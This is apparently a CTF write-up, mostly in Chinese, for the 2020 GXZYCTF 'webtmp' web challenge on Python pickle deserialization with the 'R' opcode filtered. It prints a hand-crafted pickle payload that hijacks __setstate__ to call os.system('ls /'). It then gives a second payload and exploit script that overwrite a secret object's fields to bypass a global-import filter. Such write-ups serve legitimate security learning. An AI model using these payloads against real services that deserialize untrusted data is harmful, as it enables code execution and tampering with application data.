---
title: 2020 GXZYCTF webtmp
date: 2020-03-09 09:52:20
tags:
- python反序列化构造
categories:
- Web
- Python
top: 
---

过滤了`R`

[从零开始python反序列化攻击：pickle原理解析 & 不用reduce的RCE姿势](https://zhuanlan.zhihu.com/p/89132768)

一开始考虑RCE

```
b'\x80\x03c__main__\nAnimal\n)\x81}(V__setstate__\ncos\nsystem\nubVls /\nb0c__main__\nAnimal\n)\x81}(X\x04\x00\x00\x00nameq\x03X\x14\x00\x00\x00\xe4\xb8\x80\xe7\xbb\x99\xe6\x88\x91\xe5\x93\xa9giaogiaoq\x04X\x08\x00\x00\x00categoryq\x05X\x04\x00\x00\x00Giaoq\x06ub.'
```

提示global XX，应该是因为`raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))`，后来考虑改写secret对象



![](2020_GXZYCTF_webtmp/1584744931(1).jpg)

secret.py

```
secret = {'name':'xx','category':'yy'}
```

exp.py

```python
import pickle
import pickletools
import secret
class Animal:
    def __init__(self):
        self.name = 'aa'
        self.category = 'bb'
s = b'\x80\x03c__main__\nsecret\n}(Vname\nVaa\nVcategory\nVbb\nub0c__main__\nAnimal\n)\x81}(X\x04\x00\x00\x00nameX\x02\x00\x00\x00aaX\x08\x00\x00\x00categoryX\x02\x00\x00\x00bbub.'
l = pickle.loads(s)
pickletools.dis(s)
```

![1584745003(1)](2020_GXZYCTF_webtmp/1584745003(1).jpg)

base64编码即可